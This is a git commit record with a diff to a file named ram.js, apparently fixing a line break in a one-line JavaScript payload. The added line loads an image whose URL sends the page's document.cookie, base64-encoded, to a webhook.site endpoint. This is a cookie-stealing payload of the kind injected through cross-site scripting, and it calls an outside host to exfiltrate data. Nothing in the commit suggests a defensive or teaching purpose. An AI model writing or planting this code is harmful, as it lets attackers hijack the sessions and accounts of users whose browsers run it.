9a033b40854591d11fd8e62e7375cb53b8821133
ramsurya824 <ramsurya.jsps@gmail.com>
2025-02-19 16:27:25 +0530

    Update ram.js

--- ram.js
+++ ram.js
@@ -1,2 +1,1 @@
- x = new Image(); x.src = 'https://webhook.site/957bd065-5f74-453d-bd8f-a12cf6371d9c?
- data='+btoa(document.cookie);
+ x = new Image(); x.src = 'https://webhook.site/957bd065-5f74-453d-bd8f-a12cf6371d9c?data='+btoa(document.cookie);
